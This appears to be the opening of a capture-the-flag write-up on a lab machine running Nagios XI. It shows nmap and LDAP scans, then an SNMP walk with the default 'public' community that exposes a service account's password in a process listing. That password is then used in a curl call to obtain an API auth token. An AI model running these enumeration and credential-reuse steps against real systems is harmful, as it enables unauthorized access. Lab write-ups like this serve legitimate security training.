#### Nmap

##### TCP
```bash
# Nmap 7.94SVN scan initiated Sun Jan 14 08:33:45 2024 as: nmap -p 22,80,389,443,5667 -sCV -A -T4 -O -oN nmap/port-scan 10.129.13.242
Nmap scan report for nagios.monitored.htb (10.129.13.242)
Host is up (0.051s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 61:e2:e7:b4:1b:5d:46:dc:3b:2f:91:38:e6:6d:c5:ff (RSA)
|   256 29:73:c5:a5:8d:aa:3f:60:a9:4a:a3:e5:9f:67:5c:93 (ECDSA)
|_  256 6d:7a:f9:eb:8e:45:c2:02:6a:d5:8d:4d:b3:a3:37:6f (ED25519)
80/tcp   open  http       Apache httpd 2.4.56
|_http-title: Did not follow redirect to https://nagios.monitored.htb
|_http-server-header: Apache/2.4.56 (Debian)
389/tcp  open  ldap       OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http   Apache httpd 2.4.56 ((Debian))
| tls-alpn: 
|_  http/1.1
|_http-title: Nagios XI
|_http-server-header: Apache/2.4.56 (Debian)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK
| Not valid before: 2023-11-11T21:46:55
|_Not valid after:  2297-08-25T21:46:55
5667/tcp open  tcpwrapped
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5.0
OS details: Linux 5.0
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   51.68 ms 10.10.14.1
2   51.90 ms nagios.monitored.htb (10.129.13.242)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan 14 08:34:06 2024 -- 1 IP address (1 host up) scanned in 21.25 seconds
```
```bash
# Nmap 7.94SVN scan initiated Sun Jan 14 08:48:13 2024 as: nmap -p 389 --script ldap-* -oN nmap/ldap-scan 10.129.13.242
Nmap scan report for nagios.monitored.htb (10.129.13.242)
Host is up (0.056s latency).

Bug in ldap-brute: no string output.
PORT    STATE SERVICE
389/tcp open  ldap
| ldap-search: 
|   Context: dc=monitored,dc=htb
|     dn: dc=monitored,dc=htb
|         objectClass: top
|         objectClass: dcObject
|         objectClass: organization
|         o: monitored.htb
|_        dc: monitored
| ldap-rootdse: 
| LDAP Results
|   <ROOT>
|       namingContexts: dc=monitored,dc=htb
|       supportedControl: 2.16.840.1.113730.3.4.18
|       supportedControl: 2.16.840.1.113730.3.4.2
|       supportedControl: 1.3.6.1.4.1.4203.1.10.1
|       supportedControl: 1.3.6.1.1.22
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.826.0.1.3344810.2.3
|       supportedControl: 1.3.6.1.1.13.2
|       supportedControl: 1.3.6.1.1.13.1
|       supportedControl: 1.3.6.1.1.12
|       supportedExtension: 1.3.6.1.4.1.4203.1.11.1
|       supportedExtension: 1.3.6.1.4.1.4203.1.11.3
|       supportedExtension: 1.3.6.1.1.8
|       supportedLDAPVersion: 3
|       supportedSASLMechanisms: DIGEST-MD5
|       supportedSASLMechanisms: NTLM
|       supportedSASLMechanisms: CRAM-MD5
|_      subschemaSubentry: cn=Subschema

# Nmap done at Sun Jan 14 08:48:14 2024 -- 1 IP address (1 host up) scanned in 1.79 seconds
```

##### UDP

```bash
# sudo nmap -p- -sU --min-rate=10000 --open 10.129.13.242 -oG nmap/udp-scan

Nmap scan report for nagios.monitored.htb (10.129.13.242)
Host is up (0.12s latency).
Not shown: 65453 open|filtered udp ports (no-response), 80 closed udp ports (port-unreach)
PORT    STATE SERVICE
123/udp open  ntp
161/udp open  snmp

# Nmap done: 1 IP address (1 host up) scanned in 75.43 seconds
```

#### SNMP

```bash
# snmpwalk -v2c -c public 10.129.13.242
iso.3.6.1.2.1.1.1.0 = STRING: "Linux monitored 5.10.0-27-amd64 #1 SMP Debian 5.10.205-2 (2023-12-31) x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (235812) 0:39:18.12
iso.3.6.1.2.1.1.4.0 = STRING: "Me <root@monitored.htb>"
iso.3.6.1.2.1.1.5.0 = STRING: "monitored"
iso.3.6.1.2.1.1.6.0 = STRING: "Sitting on the Dock of the Bay"
[...SNIP...]
iso.3.6.1.2.1.25.4.2.1.5.442 = STRING: "--config /etc/laurel/config.toml"
iso.3.6.1.2.1.25.4.2.1.5.522 = ""
iso.3.6.1.2.1.25.4.2.1.5.537 = ""
iso.3.6.1.2.1.25.4.2.1.5.561 = STRING: "-f"
iso.3.6.1.2.1.25.4.2.1.5.562 = STRING: "--system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only"
iso.3.6.1.2.1.25.4.2.1.5.565 = STRING: "-n -iNONE"
iso.3.6.1.2.1.25.4.2.1.5.567 = ""
iso.3.6.1.2.1.25.4.2.1.5.569 = STRING: "-u -s -O /run/wpa_supplicant"
iso.3.6.1.2.1.25.4.2.1.5.577 = STRING: "-f"
iso.3.6.1.2.1.25.4.2.1.5.615 = STRING: "-c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB "
[...SNIP...]
iso.3.6.1.2.1.25.4.2.1.5.976 = STRING: "-d /usr/local/nagios/etc/nagios.cfg"
iso.3.6.1.2.1.25.4.2.1.5.977 = STRING: "--worker /usr/local/nagios/var/rw/nagios.qh"
iso.3.6.1.2.1.25.4.2.1.5.978 = STRING: "--worker /usr/local/nagios/var/rw/nagios.qh"
iso.3.6.1.2.1.25.4.2.1.5.979 = STRING: "--worker /usr/local/nagios/var/rw/nagios.qh"
iso.3.6.1.2.1.25.4.2.1.5.980 = STRING: "--worker /usr/local/nagios/var/rw/nagios.qh"
iso.3.6.1.2.1.25.4.2.1.5.1371 = STRING: "-d /usr/local/nagios/etc/nagios.cfg"
iso.3.6.1.2.1.25.4.2.1.5.1381 = STRING: "-u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB"
iso.3.6.1.2.1.25.4.2.1.5.1382 = STRING: "-c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB"
[...SNIP...]
```

#### Nagios Auth Token

```bash
# curl -XPOST -k -L 'http://nagios.monitored.htb/nagiosxi/api/v1/authenticate?pretty=1' -d 'username=svc&password=XjH7VCehowpR1xZB&valid_min=5'
{
    "username": "svc",
    "user_id": "2",
    "auth_token": "21c6a0d8803d2da8124d38d597b6b0defd91ce25",
    "valid_min": 5,
    "valid_until": "Sun, 14 Jan 2024 03:42:25 -0500"
}
```